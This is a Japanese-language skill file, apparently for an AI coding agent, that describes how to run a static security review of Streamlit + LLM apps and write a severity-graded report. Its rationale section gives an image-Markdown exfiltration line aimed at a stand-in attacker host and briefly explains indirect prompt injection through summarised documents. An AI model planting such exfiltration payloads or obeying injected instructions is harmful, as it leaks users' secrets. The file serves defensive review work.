# Streamlit + LLM アプリ セキュリティ診断

Streamlit + LLM API アプリのコードを読んで、セキュリティ上の問題を見つけ、**セキュリティレポート**としてまとめる。

このスキルは静的なコードレビューを行う。アプリを攻撃したり、外部にリクエストを送ったりはしない。診断中はコードを書き換えない（修正は、レポートを読んだユーザーが頼んだときに行う）。

## なぜ Streamlit + LLM 特有の観点が要るのか

一般的な Web アプリの診断観点だけでは見落としが出る。このスキルで特に意識する点:

- **Streamlit はスクリプトがセッションごとに再実行される**が、`st.cache_resource`・`st.cache_data`・モジュールレベルの変数は**全ユーザーで共有**される。ここにユーザー固有のデータを入れると、他人に見える。
- **LLM の出力は「信頼できない入力」**。`st.markdown` は画像 Markdown を描画するので、`![](https://攻撃者/?q=秘密)` を出力させられると、ブラウザが勝手にデータを外部送信する。`unsafe_allow_html=True` なら XSS になる。
- **アプリ所有者の API キーで動くことが多い**。公開アプリに認証や上限がないと、他人に使われて課金が膨らむ（Denial of Wallet）。
- **入力の出どころで脅威が変わる**。本人しか使わないツールで、本人が直接打ち込む指示は攻撃にならない。一方、要約させるメールや Web ページ、アップロードされたファイルに仕込まれた指示（間接プロンプトインジェクション）は、個人用ツールでも現実の脅威になる。

## 手順

### 1. 対象と利用形態を把握する

まず対象のディレクトリを決める（指定がなければカレントディレクトリ）。README・CLAUDE.md・`.streamlit/config.toml`・Dockerfile・デプロイ設定・`requirements.txt` を読み、次を把握する。

- 使っている LLM SDK とモデル、Streamlit のバージョン
- エントリポイント（`streamlit run` するファイル）と主要なモジュール
- **利用形態**: 次のどれに当たるか。重大度の判定がこれで変わるので、根拠も控えておく。
  - **ローカル個人利用**: 自分の PC の localhost だけで使う
  - **限定共有**: 社内 LAN や、信頼できる少人数で使う
  - **インターネット公開**: Streamlit Community Cloud・Cloud Run などで公開する（予定を含む）

利用形態がはっきりしなくても、ユーザーに質問して止まらない。最も可能性が高い形態を仮定して進め、レポートに「想定した利用形態」として明記する。ローカル個人利用と判断した場合でも、公開したときに重大になる指摘は「公開時の重大度」として併記する。個人用ツールでも、あとから公開されることは多い。

### 2. 補助スキャナーで候補を洗い出す

```bash
python <このスキルのディレクトリ>/scripts/scan.py <対象ディレクトリ>
```

標準ライブラリだけで動く。危険なパターン（`unsafe_allow_html=True`・`eval`・`st.cache_resource`・ハードコードされた API キーなど）が出現する箇所を、カテゴリ別に一覧表示する。シークレットは伏せ字で表示される。

**スキャナーの結果は「確認すべき候補」であり、指摘事項そのものではない**。正規表現で拾っているだけなので、誤検知も見逃しもある。候補は必ずコードを読んで確かめ、スキャナーが拾えない問題（データの流れ、プロンプトの組み立て方、ロジック上の欠陥）は手順 3 で探す。

### 3. チェックリストに沿ってコードを読む

`references/checklist.md` を読み、全カテゴリを順に確認する。コードは小さければ全部読む。大きければ、エントリポイントから「ユーザー入力 → プロンプト → LLM → 出力の表示・利用」の流れを追い、その経路上のファイルを重点的に読む。

各指摘について、次を確かめてから記録する。

- **到達可能か**: 外部から入る値がその箇所まで届くか。定数しか渡らない `st.markdown(..., unsafe_allow_html=True)` は問題ではない。
- **攻撃者は誰か**: その利用形態で、その入力を操作できるのは誰か（本人・同僚・匿名の第三者・要約対象の文書の作者）。
- **何が起きるか**: 具体的な被害のシナリオを 1〜2 文で書けること。書けないものは指摘にせず、必要なら Info にとどめる。

`pip-audit` がインストールされていれば `pip-audit -r requirements.txt` を実行し、既知の脆弱性を確認する。入っていなければ、勝手にインストールしない。レポートの「診断の範囲と限界」に未確認と書き、導入を勧める。

対象が git リポジトリなら、`.env` や `secrets.toml` が過去にコミットされていないかも確認する（`git log --all --oneline -- .env .streamlit/secrets.toml`）。履歴に残ったキーは、ファイルを消しても漏えい済みとして扱う。

### 4. 重大度を決める

| 重大度 | 目安 |
|---|---|
| 🔴 Critical | すぐに実害が出る。例: 実際の API キーがコードやリポジトリに含まれている／ユーザー入力や LLM 出力がそのまま `eval`・`exec`・シェルで実行される |
| 🟠 High | 条件がそろうと深刻な被害が出る。例: LLM 出力を `unsafe_allow_html=True` で表示する XSS／キャッシュ経由で他ユーザーのデータが見える／認証も上限もない公開アプリ（課金の暴走）／ユーザーが指定した URL を取得する SSRF |
| 🟡 Medium | 被害は限定的、または攻撃に手間がかかる。例: 画像 Markdown による外部送信／エラー詳細（トレースバック）の表示／システムプロンプトに秘密情報がある／出力トークン数に上限がない |
| 🔵 Low | 影響が小さい、または多層防御として望ましい。例: 依存パッケージのバージョン未固定／入力長に上限がない（ローカル利用） |
| ⚪ Info | 問題ではないが知っておくべきこと。改善の提案 |

重大度は利用形態に合わせて調整する。同じ「認証なし」でも、ローカル個人利用なら Info、インターネット公開なら High になる。利用形態によって重大度が変わる指摘には、「公開時の重大度」を併記する。

### 5. レポートを書く

下のテンプレートどおりに、対象プロジェクトのルートへ `security-report-YYYY-MM-DD.md` として保存する（日付は診断日）。チャットには、総評と件数、最優先の対応 1〜3 件だけを短く伝え、ファイルの場所を示す。

レポートを書くときの注意:

- **シークレットは絶対に全文を書かない**。レポートは共有されることがあるので、`AIzaSy…(伏せ字)` のように先頭数文字だけ示す。
- 「場所」は `ファイル:行番号` で書く。根拠のコード片は数行に絞る。
- 対策は、そのプロジェクトのコードに即した具体的な修正例を示す。一般論だけで終わらせない。
- **「問題がなかった項目」も書く**。何を確認して大丈夫だったのかが分かると、読み手はレポートを信頼でき、どこまで調べたかも伝わる。
- 指摘がゼロでも、レポートは作る。
- 専門用語には、初出で短い説明を添える（例: 「SSRF（サーバーに、内部ネットワークなど意図しない宛先へリクエストさせる攻撃）」）。読み手はセキュリティの専門家とは限らない。
